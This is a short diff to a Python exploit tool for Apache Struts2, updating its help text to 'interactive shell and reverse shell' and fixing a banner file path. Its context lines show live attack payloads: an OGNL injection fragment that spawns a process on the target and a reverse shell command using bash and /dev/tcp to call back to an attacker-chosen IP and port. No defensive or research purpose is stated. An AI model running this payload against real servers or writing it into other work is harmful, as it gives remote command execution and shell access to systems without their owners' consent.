@@ -9,7 +9,7 @@ import os
 from urllib import parse
 urllib3.disable_warnings() #Disable Warnings of SSL
 
-parser = argparse.ArgumentParser(description="Struts2")
+parser = argparse.ArgumentParser(description="Struts2 interactive shell and reverse shell", usage='python3 main.py https://www.target.com/ -c | -l 127.0.0.1 -p 443')
 group = parser.add_mutually_exclusive_group()
 group.add_argument("-c", "--cmd", help="Interactive cmd", action="store_true")
 parser.add_argument("-t", "--target",  help="Target",required=True)
@@ -31,7 +31,7 @@ b = "'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamR
 reverse = urllib.parse.quote(f'printf "bash -i >& /dev/tcp/{ip}/{port} 0>&1" > /tmp/rev.sh | bash', safe='')
 
 def banner() -> str: #PrintBanner
-    path: str = "/ui/banner.txt"
+    path: str = "ui/banner.txt"
     with open(path) as file:
         content = file.read()
         print(f"{content}")
